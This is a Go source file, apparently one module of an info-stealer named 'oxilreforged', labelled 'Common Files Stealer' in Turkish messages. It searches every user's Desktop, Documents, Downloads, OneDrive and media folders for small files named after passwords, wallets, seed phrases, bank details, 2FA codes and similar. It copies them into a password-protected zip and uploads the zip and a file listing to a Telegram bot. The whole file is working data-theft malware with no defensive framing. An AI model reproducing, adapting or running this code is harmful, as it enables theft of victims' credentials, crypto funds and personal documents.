package commonfiles

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	"oxilreforged/modules/telegram"
	"oxilreforged/utils/fileutil"
	"oxilreforged/utils/hardware"
)

func Run(botToken string, chatID string) {
	tempDir := filepath.Join(os.TempDir(), "commonfiles-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	extensions := []string{
		".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".pdf", ".rtf", ".json", ".csv", ".db",
		".jpg", ".jpeg", ".png", ".gif", ".webp", ".mp4",
	}

	keywords := []string{
		"account", "password", "secret", "mdp", "motdepass", "mot_de_pass", "login",
		"paypal", "banque", "seed", "bancaire", "bank", "metamask", "wallet", "crypto",
		"exodus", "atomic", "auth", "mfa", "2fa", "code", "memo", "compte", "token",
		"credit", "card", "mail", "address", "phone", "permis", "number", "backup",
		"database", "config",
	}

	found := 0

	for _, user := range hardware.GetUsers() {
		for _, baseDir := range []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		} {
			if _, err := os.Stat(baseDir); err != nil {
				continue
			}

			filepath.Walk(baseDir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() || info.Size() > 2*1024*1024 {
					return nil
				}

				filenameLower := strings.ToLower(info.Name())

				keywordMatch := false
				for _, keyword := range keywords {
					if strings.Contains(filenameLower, keyword) {
						keywordMatch = true
						break
					}
				}
				if !keywordMatch {
					return nil
				}

				extMatch := false
				for _, ext := range extensions {
					if strings.HasSuffix(filenameLower, ext) {
						extMatch = true
						break
					}
				}
				if !extMatch {
					return nil
				}

				username := strings.Split(user, "\\")[2]
				dest := filepath.Join(tempDir, username, info.Name())

				if fileutil.Exists(dest) {
					dest = filepath.Join(tempDir, username, fmt.Sprintf("%s_%s", info.Name(), randString(4)))
				}

				os.MkdirAll(filepath.Join(tempDir, username), os.ModePerm)
				if err := fileutil.CopyFile(path, dest); err != nil {
					return nil
				}

				found++
				return nil
			})
		}
	}

	if found == 0 {
		return
	}

	tempZip := filepath.Join(os.TempDir(), "commonfiles.zip")
	password := randString(16)
	if err := fileutil.ZipWithPassword(tempDir, tempZip, password); err != nil {
		return
	}
	defer os.Remove(tempZip)

	tree := fileutil.Tree(tempDir, "")
	message := fmt.Sprintf(
		"*📁 Common Files Stealer*\n\n"+
			"**Bulunan Dosya Sayısı:** `%d`\n"+
			"**ZIP Şifresi:** `%s`\n\n"+
			"**Klasör Yapısı:**\n```%s```",
		found,
		password,
		tree,
	)

	_ = telegram.SendTextToTelegram(botToken, chatID, message)

	caption := fmt.Sprintf("Şifreli dosyalar arşivi (Şifre: %s)", password)
	_ = telegram.SendZipToTelegram(botToken, chatID, caption, tempZip)
}

func randString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	rand.Seed(time.Now().UnixNano())
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
